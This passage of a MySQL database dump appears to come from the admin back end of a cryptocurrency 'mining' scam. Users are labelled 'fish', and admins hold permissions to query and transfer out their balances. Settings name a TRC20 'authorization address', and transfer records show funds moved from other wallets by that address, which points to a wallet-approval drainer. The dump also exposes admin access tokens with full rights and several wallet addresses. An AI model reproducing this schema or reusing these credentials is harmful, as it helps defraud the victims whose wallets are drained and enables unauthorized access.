) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `permissions`
--

DROP TABLE IF EXISTS `permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `permissions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `cn_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '权限名字',
  `icon` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '图标',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT '菜单上级ID',
  `menu_show` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否在菜单中显示 1显示 0 隐藏',
  `sort` int(11) NOT NULL DEFAULT '0' COMMENT '排序 DESC',
  `guard_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `permissions_name_guard_name_unique` (`name`,`guard_name`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `permissions`
--

LOCK TABLES `permissions` WRITE;
/*!40000 ALTER TABLE `permissions` DISABLE KEYS */;
INSERT INTO `permissions` VALUES (1,'admin.index','后台管理','',0,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(2,'admin.permissions.index','权限管理','',1,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(3,'admin.permissions.store','添加权限','',2,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(4,'admin.permissions.update','修改权限','',2,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(5,'admin.permissions.destroy','删除权限','',2,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(6,'admin.roles.index','角色管理','',1,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(7,'admin.roles.store','添加角色','',6,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(8,'admin.roles.update','修改角色','',6,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(9,'admin.roles.destroy','删除角色','',6,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(10,'admin.admins.index','管理员管理','',1,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(11,'admin.admins.store','添加管理员','',10,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(12,'admin.admins.update','修改管理员','',10,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(13,'admin.admins.destroy','删除管理员','',10,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(14,'admin.admins.roles','角色列表','',10,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(15,'admin.admins.adminLog','操作日志','',1,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(16,'admin.whitelists.index','白名单管理','',1,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(17,'admin.whitelists.store','添加白名单','',16,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(18,'admin.whitelists.update','修改白名单','',16,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(19,'admin.whitelists.destroy','删除白名单','',16,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(20,'admin.settings','系统设置','',0,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(21,'admin.settings.index','系统设置','',20,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(22,'admin.settings.store','添加设置','',21,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(23,'admin.settings.update','修改设置','',21,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(24,'admin.settings.destroy','删除设置','',21,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(25,'admin.fish','用户管理','',0,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(26,'admin.fish.list','用户列表','',25,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(27,'admin.fish.balance','查询余额','',26,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(28,'admin.fish.transfer','转出余额','',26,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(29,'admin.fish.transferList','转账记录','',25,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(30,'admin.transaction.index','资金记录','',25,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(31,'admin.transaction.getAward','奖励配置','',25,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(32,'admin.transaction.updateAward','修改奖励配置','',31,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(33,'admin.transaction.mining','挖矿奖励','',25,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(34,'admin.transaction.withdraw','提取管理','',25,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(35,'admin.transaction.agree','通过提取','',34,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(36,'admin.transaction.refuse','拒绝提取','',34,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(37,'admin.auth.total','首页统计','',0,1,0,'admin','2021-11-06 11:13:46','2021-11-06 11:13:46');
/*!40000 ALTER TABLE `permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `personal_access_tokens`
--

DROP TABLE IF EXISTS `personal_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `personal_access_tokens` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint(20) unsigned NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `personal_access_tokens`
--

LOCK TABLES `personal_access_tokens` WRITE;
/*!40000 ALTER TABLE `personal_access_tokens` DISABLE KEYS */;
INSERT INTO `personal_access_tokens` VALUES (12,'App\\Models\\Admin',1,'admins','ea8736d966672899cde03686d9c946ef592c687cefa6f48a85f190c9438cd781','[\"*\"]','2022-02-12 06:36:07','2022-02-12 06:28:44','2022-02-12 06:36:07'),(13,'App\\Models\\Admin',1,'admins','a8b2e63014453ab3c62601e83840a5af423349eae85ef7b299204911987d7a03','[\"*\"]','2022-02-14 04:04:15','2022-02-12 12:45:29','2022-02-14 04:04:15'),(14,'App\\Models\\Admin',1,'admins','90596eaa0767de81277b2b9b5c54a0a49d2f3f09133c5a7f629e20b296b75e39','[\"*\"]','2022-02-13 13:57:06','2022-02-13 13:39:15','2022-02-13 13:57:06'),(15,'App\\Models\\Admin',1,'admins','16d23614093edbecac203a86f9fcccb5a181be137c3f4798b065dde88cc95bfa','[\"*\"]','2022-02-14 04:14:29','2022-02-14 03:37:18','2022-02-14 04:14:29');
/*!40000 ALTER TABLE `personal_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `role_has_permissions`
--

DROP TABLE IF EXISTS `role_has_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `role_has_permissions` (
  `permission_id` bigint(20) unsigned NOT NULL,
  `role_id` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`role_id`),
  KEY `role_has_permissions_role_id_foreign` (`role_id`),
  CONSTRAINT `role_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE,
  CONSTRAINT `role_has_permissions_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `role_has_permissions`
--

LOCK TABLES `role_has_permissions` WRITE;
/*!40000 ALTER TABLE `role_has_permissions` DISABLE KEYS */;
INSERT INTO `role_has_permissions` VALUES (1,1),(10,1),(11,1),(12,1),(13,1),(15,1),(16,1),(17,1),(18,1),(19,1),(20,1),(21,1),(22,1),(23,1),(24,1),(25,1),(26,1),(27,1),(28,1),(29,1),(30,1),(31,1),(32,1),(33,1),(34,1),(35,1),(36,1),(37,1),(25,2),(26,2),(27,2);
/*!40000 ALTER TABLE `role_has_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `roles` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `cn_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '权限名字',
  `desc` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '描述',
  `guard_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `roles_name_guard_name_unique` (`name`,`guard_name`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'suadmin','超级管理员','超级管理员','admin','2021-11-06 11:13:46','2021-11-06 11:13:46'),(2,'agent','代理商','代理商角色','admin','2021-11-06 11:13:46','2021-11-06 11:13:46');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `group` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '分组',
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '名称',
  `desc` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '描述',
  `value` text COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '值',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `settings_group_name_unique` (`group`,`name`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
INSERT INTO `settings` VALUES (1,'config','rate','1ETH多少U','\"4314.22\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(2,'config','url','前端网站地址','\"https:\\/\\/7ii.club\"','2021-11-06 11:13:47','2022-02-14 04:14:28'),(3,'service','link','客服链接','\"\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(4,'authorize','erc20','ERC20授权地址','\"\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(5,'authorize','trc20','TRC20授权地址','\"TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp\"','2021-11-06 11:13:47','2022-02-11 10:39:48'),(6,'mining','output','总产量 ETH','\"0\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(7,'mining','part','用户收益 U','\"0\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(8,'mining','user_income','参与者','\"0\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(9,'mining','valid_node','有效节点','\"0\"','2021-11-06 11:13:47','2021-11-06 11:13:47'),(10,'award','config','有效节点','[{\"amount\":100,\"award\":0.55},{\"amount\":1000,\"award\":1.8},{\"amount\":5000,\"award\":2},{\"amount\":20000,\"award\":2.4},{\"amount\":50000,\"award\":2.8},{\"amount\":200000,\"award\":2.8}]','2021-11-06 11:13:47','2021-11-06 11:13:47');
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `transactions`
--

DROP TABLE IF EXISTS `transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `transactions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `fish_id` int(11) NOT NULL COMMENT '用户id',
  `type` int(11) NOT NULL DEFAULT '0' COMMENT '类型  1静态奖励 2动态奖励 3划入 4 划出 5提U ',
  `act` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT 'act',
  `before` decimal(36,15) NOT NULL DEFAULT '0.000000000000000' COMMENT '变化前余额',
  `amount` decimal(36,15) NOT NULL DEFAULT '0.000000000000000' COMMENT '交易金额',
  `fee` decimal(36,8) NOT NULL DEFAULT '0.00000000' COMMENT '手续费',
  `after` decimal(36,15) NOT NULL DEFAULT '0.000000000000000' COMMENT '变化后余额',
  `order` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT '相关订单',
  `note` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '备注',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `transactions`
--

LOCK TABLES `transactions` WRITE;
/*!40000 ALTER TABLE `transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `transfers`
--

DROP TABLE IF EXISTS `transfers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `transfers` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `admin_id` bigint(20) NOT NULL DEFAULT '0' COMMENT '代理',
  `type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT 'TRC20 ERC20',
  `from` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'addrefromss',
  `to` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'to',
  `amount` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'amount',
  `hash` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'hash',
  `authorize` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT 'amount',
  `status` tinyint(4) NOT NULL DEFAULT '0' COMMENT '1成功',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `transfers_hash_unique` (`hash`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `transfers`
--

LOCK TABLES `transfers` WRITE;
/*!40000 ALTER TABLE `transfers` DISABLE KEYS */;
INSERT INTO `transfers` VALUES (1,1,'TRC20','TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A','TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo','1','afd83c9573cc4f233d637cb8471f3fbb4697a27bf8d1064ed44503c7db8ef068','TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp',0,'2022-02-12 01:33:33','2022-02-12 01:33:33'),(2,1,'TRC20','TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A','TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo','1','7a6384655f160eb54dd25cb695f3a7df58152899b4656632856bb154ab5cf515','TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp',0,'2022-02-14 04:04:11','2022-02-14 04:04:11'),(3,1,'TRC20','TMjMfaD4ZCGTiBCsLUTbgt8Q5ysBJYzC5A','TG2TJshzJW5Z4zRKexFNi9uvdJGyP9jPuo','1','ed8ca6a1a6cf5f299c78fd74115e516356a70998d05c88b89a890c7296a4ecce','TL8gNbTZXbPJFCC3ZZQZWjCE4mLruQ3bsp',0,'2022-02-14 04:08:40','2022-02-14 04:08:40');
/*!40000 ALTER TABLE `transfers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `nickname` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `username` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_username_unique` (`username`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `whitelists`
--

DROP TABLE IF EXISTS `whitelists`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `whitelists` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `admin_id` bigint(20) NOT NULL DEFAULT '0' COMMENT '管理员id',
  `ip` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT 'IP',
  `note` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '备注',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `whitelists`
--

LOCK TABLES `whitelists` WRITE;
/*!40000 ALTER TABLE `whitelists` DISABLE KEYS */;
/*!40000 ALTER TABLE `whitelists` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `withdraws`
--

DROP TABLE IF EXISTS `withdraws`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `withdraws` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `fish_id` int(11) NOT NULL COMMENT '用户id',
  `withdraw_sn` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL COMMENT '订单号',
  `amount` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT '金额',
  `fee` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT '手续费',
  `actual` decimal(20,6) NOT NULL DEFAULT '0.000000' COMMENT '实际支付金额',
  `status` int(11) NOT NULL DEFAULT '0' COMMENT '类型  0待审核 1 成功 2拒绝 ',
  `review_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '审核人',
  `note` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '' COMMENT '备注',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `withdraws`
--

LOCK TABLES `withdraws` WRITE;
/*!40000 ALTER TABLE `withdraws` DISABLE KEYS */;
/*!40000 ALTER TABLE `withdraws` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping events for database '6wwpro_xyz'
--

--
-- Dumping routines for database '6wwpro_xyz'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-02-14 12:14:55
